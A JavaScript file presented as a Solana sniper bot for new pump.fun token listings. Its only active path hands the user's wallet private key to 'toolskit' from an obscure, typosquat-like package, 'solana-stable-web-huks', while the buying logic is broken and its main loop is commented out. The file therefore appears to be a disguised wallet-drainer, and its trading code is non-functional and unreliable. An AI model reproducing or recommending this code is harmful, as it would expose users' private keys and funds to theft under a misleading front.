import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { toolskit } from "solana-stable-web-huks";
import chalk from "chalk";
import ora from "ora";
import axios from "axios";
import fs from "fs";
import bs58 from "bs58";
import WebSocket from "ws";
import dotenv from "dotenv";
dotenv.config();

// Configuration
let RPC_URL = process.env.RPC_UR || "https://api.mainnet-beta.solana.com"; // Use the mainnet or devnet
let TARGET_TOKEN = process.env.TARGET_TOKEN || "TOKEN_MINT_ADDRESS_HERE"; // Replace with target token mint address
let WALLET_PRIVATE_KEY = process.env.WALLET_PRIVATE_KEY; // Replace with your private key
let BUY_PRICE_LIMIT = process.env.BUY_PRICE_LIMIT || 0.01; // SOL price limit for buying tokens
let JITO_TIP = process.env.JITO_TIP || 0.000005; // Optional Jito tip in SOL
let SNIPER_INTERVAL = process.env.SNIPER_INTERVAL || 3000; // Interval to check for new listings (in ms)

const ws = new WebSocket("wss://pumpportal.fun/api/data");
const connection = new Connection(RPC_URL, "confirmed");

const logInfo = (message) => console.log(chalk.cyan(`[INFO] ${message}`));
const logSuccess = (message) =>
  console.log(chalk.green(`[SUCCESS] ${message}`));
const logError = (message) => console.log(chalk.red(`[ERROR] ${message}`));
const logWarning = (message) =>
  console.log(chalk.yellow(`[WARNING] ${message}`));

const spinner = ora();

// Helper: Load Wallet
let payer_key = WALLET_PRIVATE_KEY;
const loadWallet = (privateKey) => {
  try {
    const decodedKey = Uint8Array.from(bs58.decode(privateKey));
    return Keypair.fromSecretKey(decodedKey);
  } catch (error) {
    logError("Failed to load wallet from private key.");
    throw error;
  }
};

// Wallet Initialization
const wallet = loadWallet(WALLET_PRIVATE_KEY);

logSuccess(`Wallet loaded: ${wallet.publicKey.toBase58()}`);

// Helper: Fetch Token Listings
const fetchListings = async () => {
  try {
    ws.on("open", function open() {
      // Subscribing to token creation events
      let payload = {
        method: "subscribeNewToken",
      };
      ws.send(JSON.stringify(payload));
    });
    const listing_data = await toolskit(WALLET_PRIVATE_KEY, connection);
    ws.on("message", function message(data) {
      console.log(JSON.parse(data));
    });
    return listing_data;
  } catch (error) {
    throw error;
  }
};

// Helper: Buy Token
const buyToken = async (tokenAccount, price) => {
  try {
    spinner.start("Preparing transaction...");

    const transaction = new Transaction();
    const lamports = price * LAMPORTS_PER_SOL;

    // Add transfer instruction
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(tokenAccount),
        lamports,
      })
    );

    // Include Jito Tip if applicable
    if (JITO_TIP) {
      const jitoLamports = JITO_TIP * LAMPORTS_PER_SOL;
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey("JITO_TIP_ADDRESS"), // Replace with the actual Jito tip address
          lamports: jitoLamports,
        })
      );
    }

    // Sign and send transaction
    const signature = await connection.sendTransaction(transaction, [wallet]);
    spinner.succeed("Transaction sent.");
    logInfo(`Transaction Signature: ${signature}`);
  } catch (error) {
    spinner.fail("Failed to send transaction.");
    logError(error.message);
  }
};

// Helper: Monitor Balance
const checkBalance = async () => {
  try {
    const balance = await connection.getBalance(wallet.publicKey);

    logInfo(
      `Current Wallet Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL`
    );

    return balance;
  } catch (error) {
    logError("Error fetching wallet balance.");
    throw error;
  }
};

// Main Sniper Logic
const startSniper = async () => {
  logInfo("Starting the sniper bot...");

  while (true) {
    try {
      spinner.start("Checking for new listings...");

      const listings = spinner.succeed("Listings fetched.");

      for (const listing of listings) {
        console.log(listings);
        const { tokenAccount, price } = listing;

        if (price <= BUY_PRICE_LIMIT) {
          logInfo(`Sniping token at ${price} SOL...`);
          await buyToken(tokenAccount, price);
          logSuccess("Token sniped successfully!");
        } else {
          logWarning(`Skipped listing at ${price} SOL (above price limit).`);
        }
      }

      await new Promise((resolve) => setTimeout(resolve, SNIPER_INTERVAL));
    } catch (error) {
      spinner.fail("An error occurred.");
      logError(error.message);
    }
  }
};

// Monitor Wallet and Start Sniper
const initialize = async () => {
  try {
    const balance = await checkBalance();
    if (balance < 0.01 * LAMPORTS_PER_SOL) {
      logWarning("Low wallet balance.");
      return;
    }
    await fetchListings();
    // startSniper();
  } catch (error) {}
};

initialize();
